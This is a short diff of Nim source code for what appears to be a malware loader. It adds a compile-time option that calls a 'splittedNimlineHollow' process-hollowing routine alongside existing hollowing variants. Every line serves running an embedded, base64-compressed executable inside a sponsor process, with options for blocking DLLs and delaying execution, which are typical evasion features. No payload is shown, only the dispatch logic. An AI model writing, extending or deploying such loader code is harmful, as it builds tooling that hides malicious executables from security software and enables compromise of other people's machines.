@@ -12,6 +12,8 @@ when defined(hollowsimple):
     import hollowsimple
 when defined(hollownimline):
     import hollowNimlineWhispers
+when defined(hollowSplitted):
+    import hollowSplitted
 
 
 proc execute(compressedBase64PE: string, sponsorCmd: string = getAppFilename(), isBlockDlls: bool, sleepSeconds: int = 0): bool =
@@ -34,6 +36,8 @@ proc execute(compressedBase64PE: string, sponsorCmd: string = getAppFilename(), 
         return simpleHollow(peStr, ppi)
     when defined(hollownimline):
         return nimlineHollow(peStr, ppi)
+    when defined(hollowSplitted):
+        return splittedNimlineHollow(peStr, ppi)
 
 
 proc main*() =
